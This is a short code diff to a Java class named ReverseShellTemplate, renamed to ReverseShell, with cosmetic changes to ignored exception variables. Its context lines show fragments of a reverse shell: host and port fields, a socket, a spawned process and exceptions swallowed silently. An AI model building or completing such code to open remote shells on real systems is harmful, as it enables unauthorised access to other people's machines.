@@ -4,7 +4,7 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 
-public class ReverseShellTemplate {
+public class ReverseShell {
     public static String host;
     public static int port;
 
@@ -28,10 +28,10 @@ public class ReverseShellTemplate {
                 try {
                     p.exitValue();
                     break;
-                } catch (Exception e) { }
+                } catch (Exception ignore) { }
             }
             p.destroy();
             s.close();
-        } catch (Exception e) { }
+        } catch (Exception ignore) { }
     }
 }
